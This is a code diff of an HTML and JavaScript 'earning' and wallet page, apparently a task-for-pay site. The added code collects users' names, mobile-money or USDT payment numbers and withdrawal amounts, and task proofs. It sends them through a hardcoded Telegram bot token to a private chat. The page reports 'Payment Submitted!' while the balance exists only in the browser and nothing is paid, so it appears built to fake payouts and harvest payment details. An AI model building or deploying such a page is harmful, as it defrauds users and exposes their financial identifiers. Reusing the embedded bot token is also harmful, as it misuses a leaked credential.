@@ -28,7 +28,7 @@
             text-align: center;
             color: #333;
         }
-        .button {
+        .wallet-button, .extra-button {
             width: 100%;
             padding: 10px;
             font-size: 1rem;
@@ -39,10 +39,10 @@
             cursor: pointer;
             margin-top: 10px;
         }
-        .button:hover {
+        .wallet-button:hover, .extra-button:hover {
             background: #0056b3;
         }
-        .popup {
+        .popup-form, .task-popup {
             position: fixed;
             top: 0;
             left: 0;
@@ -54,7 +54,7 @@
             align-items: center;
             z-index: 1000;
         }
-        .popup-content {
+        .popup-content, .task-content {
             background: #fff;
             padding: 20px;
             border-radius: 8px;
@@ -63,7 +63,7 @@
             width: 90%;
             max-width: 400px;
         }
-        .popup-content textarea, .popup-content input {
+        .popup-content input, .popup-content select, .task-content input, .task-content textarea {
             width: 100%;
             padding: 10px;
             margin: 10px 0;
@@ -71,86 +71,211 @@
             border-radius: 5px;
             font-size: 1rem;
         }
+        .popup-content button, .task-content button {
+            padding: 10px 20px;
+            background: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+        .popup-content button:hover, .task-content button:hover {
+            background: #0056b3;
+        }
+        .popup-content .cancel-btn, .task-content .cancel-btn {
+            background: #ff4d4d;
+        }
+        .popup-content .cancel-btn:hover, .task-content .cancel-btn:hover {
+            background: #cc0000;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Earning From M A I</h2>
-        <button class="button" onclick="viewBalance()">Balance</button>
-        <button class="button" onclick="viewTasks()">Tasks</button>
-        <button class="button" onclick="openWalletPopup()">Wallet</button>
-        <button class="button" onclick="depositFunds()">Deposit</button>
-        <button class="button" onclick="openSettings()">Settings</button>
+        <h2>Wallet</h2>
+        <button class="wallet-button" onclick="viewBalance()">Balance</button>
+        <button class="wallet-button" onclick="viewTasks()">Task</button>
+        <button class="wallet-button" onclick="openWalletPopup()">Wallet</button>
+        <button class="wallet-button" onclick="depositFunds()">Deposit</button>
+        <button class="wallet-button" onclick="openSettings()">Settings</button>
     </div>
 
-    <div class="popup" id="tasksPopup">
+    <div class="popup-form" id="walletPopup">
         <div class="popup-content">
-            <h3>Tasks</h3>
-            <div>
-                <h4>Task 1: Visit Website</h4>
-                <p>Description: Visit the following website and explore.</p>
-                <p>Link: <a href="https://example.com" target="_blank">Click Here</a></p>
-                <p>Rate: $1</p>
-                <textarea id="task1Proof" placeholder="Enter proof for Task 1"></textarea>
-                <button onclick="submitTask(1)">Submit</button>
-            </div>
-            <div>
-                <h4>Task 2: Watch Video</h4>
-                <p>Description: Watch the video linked below.</p>
-                <p>Link: <a href="https://youtube.com" target="_blank">Watch Video</a></p>
-                <p>Rate: $2</p>
-                <textarea id="task2Proof" placeholder="Enter proof for Task 2"></textarea>
-                <button onclick="submitTask(2)">Submit</button>
-            </div>
-            <button onclick="closePopup('tasksPopup')">Close</button>
+            <h3>Enter Payment Details</h3>
+            <input type="text" id="fullName" placeholder="Your Full Name" required>
+            <select id="paymentMethod" required>
+                <option value="" disabled selected>Select Payment Method</option>
+                <option value="Bkash">Bkash</option>
+                <option value="Nagad">Nagad</option>
+                <option value="USD Tether TRC20">USD Tether TRC20</option>
+            </select>
+            <input type="text" id="paymentNumber" placeholder="Payment Number" required>
+            <input type="number" id="amount" placeholder="Amount (USD)" required>
+            <button onclick="submitPayment()">Submit</button>
+            <button class="cancel-btn" onclick="closeWalletPopup()">Cancel</button>
+        </div>
+    </div>
+
+    <div class="task-popup" id="taskPopup">
+        <div class="task-content">
+            <h3>Complete Task</h3>
+            <h4 id="taskTitle"></h4>
+            <p id="taskDescription"></p>
+            <a id="taskLink" href="#" target="_blank">Task Link</a>
+            <input type="text" id="taskProof" placeholder="Submit proof here">
+            <input type="file" id="taskImage">
+            <button onclick="submitTask()">Submit Task</button>
+            <button class="cancel-btn" onclick="closeTaskPopup()">Cancel</button>
         </div>
     </div>
 
     <script>
-        let balance = 10; // Example balance
-        let completedTasks = JSON.parse(localStorage.getItem('tasks')) || [];
+        let balance = 10; // Example balance, change as needed
+        let taskList = [
+            { id: 1, title: 'Task 1', description: 'Description for task 1', link: 'https://example.com/task1', rate: 2 },
+            { id: 2, title: 'Task 2', description: 'Description for task 2', link: 'https://example.com/task2', rate: 5 },
+        ];
+        let completedTasks = [];
 
         function viewBalance() {
-            alert(`Your current balance is $${balance}`);
+            alert(`Your current balance is ${balance} USD.`);
         }
 
         function viewTasks() {
-            document.getElementById('tasksPopup').style.display = 'flex';
+            if (taskList.length > 0) {
+                const task = taskList[0];
+                document.getElementById('taskTitle').innerText = task.title;
+                document.getElementById('taskDescription').innerText = task.description;
+                document.getElementById('taskLink').href = task.link;
+                document.getElementById('taskPopup').style.display = 'flex';
+            } else {
+                alert('No tasks available.');
+            }
         }
 
         function openWalletPopup() {
-            alert('Wallet popup opened!');
+            document.getElementById('walletPopup').style.display = 'flex';
+        }
+
+        function closeWalletPopup() {
+            document.getElementById('walletPopup').style.display = 'none';
+        }
+
+        function submitPayment() {
+            const fullName = document.getElementById('fullName').value.trim();
+            const paymentMethod = document.getElementById('paymentMethod').value;
+            const paymentNumber = document.getElementById('paymentNumber').value.trim();
+            const amount = parseFloat(document.getElementById('amount').value);
+
+            if (!fullName || !paymentMethod || !paymentNumber || isNaN(amount)) {
+                alert('Please fill in all the fields.');
+                return;
+            }
+
+            if (amount < 5) {
+                alert('Minimum withdrawal amount is 5 USD.');
+                return;
+            }
+
+            if (amount > balance) {
+                alert('Insufficient balance.');
+                closeWalletPopup();
+                return;
+            }
+
+            balance -= amount;
+            alert('Payment Submitted!');
+
+            sendToTelegram(fullName, paymentMethod, paymentNumber, amount);
+            closeWalletPopup();
+        }
+
+        function submitTask() {
+            const taskProof = document.getElementById('taskProof').value.trim();
+            const taskImage = document.getElementById('taskImage').files[0];
+
+            if (!taskProof) {
+                alert('Please provide proof for the task.');
+                return;
+            }
+
+            if (taskImage) {
+                // Here you could upload the image to a server if required
+                alert('Proof submitted with image!');
+            } else {
+                alert('Proof submitted without image!');
+            }
+
+            completedTasks.push(taskList[0]);
+            taskList.shift();  // Remove the completed task from list
+            sendTaskToTelegram(taskProof, taskImage);
+            closeTaskPopup();
+        }
+
+        function closeTaskPopup() {
+            document.getElementById('taskPopup').style.display = 'none';
+        }
+
+        function sendToTelegram(fullName, paymentMethod, paymentNumber, amount) {
+            const telegramToken = '7618245891:AAFh8nnfrKjGgiOWL5qijC_jPFDd3KjdejY';
+            const chatId = '6633541228';
+            const message = `
+                Payment Request:
+                Name: ${fullName}
+                Method: ${paymentMethod}
+                Number: ${paymentNumber}
+                Amount: ${amount} USD
+            `;
+
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Message sent to Telegram.');
+                    } else {
+                        console.error('Failed to send message to Telegram:', data);
+                    }
+                })
+                .catch(err => console.error('Error:', err));
+        }
+
+        function sendTaskToTelegram(taskProof, taskImage) {
+            const telegramToken = '7618245891:AAFh8nnfrKjGgiOWL5qijC_jPFDd3KjdejY';
+            const chatId = '6633541228';
+            const message = `
+                Task Submitted:
+                Proof: ${taskProof}
+                Image: ${taskImage ? 'Image Attached' : 'No Image'}
+            `;
+
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Task submission sent to Telegram.');
+                    } else {
+                        console.error('Failed to send task submission to Telegram:', data);
+                    }
+                })
+                .catch(err => console.error('Error:', err));
         }
 
         function depositFunds() {
             const depositAmount = prompt('Enter deposit amount (USD):');
             if (depositAmount && !isNaN(depositAmount) && depositAmount > 0) {
                 balance += parseFloat(depositAmount);
-                alert(`Successfully deposited $${depositAmount}. New balance is $${balance}.`);
+                alert(`Successfully deposited ${depositAmount} USD. New balance is ${balance} USD.`);
             } else {
                 alert('Invalid deposit amount.');
             }
         }
 
         function openSettings() {
-            alert('Settings:\n1. Change Password\n2. Update Profile\n3. Notifications');
-        }
-
-        function submitTask(taskNumber) {
-            const proof = document.getElementById(`task${taskNumber}Proof`).value.trim();
-            if (proof === '') {
-                alert('Please enter proof to submit the task.');
-                return;
-            }
-
-            completedTasks.push({ taskNumber, proof });
-            localStorage.setItem('tasks', JSON.stringify(completedTasks));
-
-            alert(`Task ${taskNumber} submitted successfully.`);
-        }
-
-        function closePopup(popupId) {
-            document.getElementById(popupId).style.display = 'none';
+            alert('Settings:\n1. Change password\n2. Update profile\n3. Notifications');
         }
     </script>
 </body>
